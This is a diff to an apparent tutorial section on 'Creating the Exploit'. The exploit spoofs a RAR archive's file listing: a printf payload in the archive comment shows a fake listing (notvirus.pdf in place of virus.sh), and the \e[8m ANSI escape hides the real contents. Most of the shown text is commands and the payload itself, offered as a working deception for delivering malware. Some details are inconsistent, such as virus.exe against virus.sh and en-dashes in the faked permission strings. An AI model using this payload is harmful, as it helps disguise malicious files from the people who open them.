@@ -30,14 +30,14 @@ Creating the Exploit
 First, we will place our virus.exe file inside a RAR archive:
 
 ```bash
-$ ls 
+$ ls myfolder
 virus.sh
-$ rar a demo.rar virus.sh
+$ rar a demo.rar myfolder
 ```
 
 Next, we will add the following payload to the comment section:
 ```bash
-printf 'Archive: demo.rar\nDetails: RAR 5\n\nAttributes      Size       Date   Time   Name\n----------- ---------  ---------- -----  ---------\n-rw-r--r--          7  2024-05-19 16:26  notvirus.pdf\n----------- ---------  ---------- -----  ---------\n                    7                    1\e[8m' | rar c demo.rar
+printf 'Archive: demo.rar\nDetails: RAR 5\n\nAttributes      Size       Date   Time   Name\n----------- ---------  ---------- -----  ---------\n-rw-r--r–        7    2024-05-19  16:26  notvirus.pdf\n-rw-r--r–      193    2024-05-19  16:26  script.sh\n----------- ---------  ---------- -----  ---------\n               200                          2\e[8m' | rar c demo.rar
 ```
 
 This payload includes a fake listing where virus.sh is replaced with notvirus.pdf. The ANSI escape sequence \e[8m is used to hide all content after the comment section in the output. Consequently, the actual file listing is hidden, and our fake file listing is displayed.
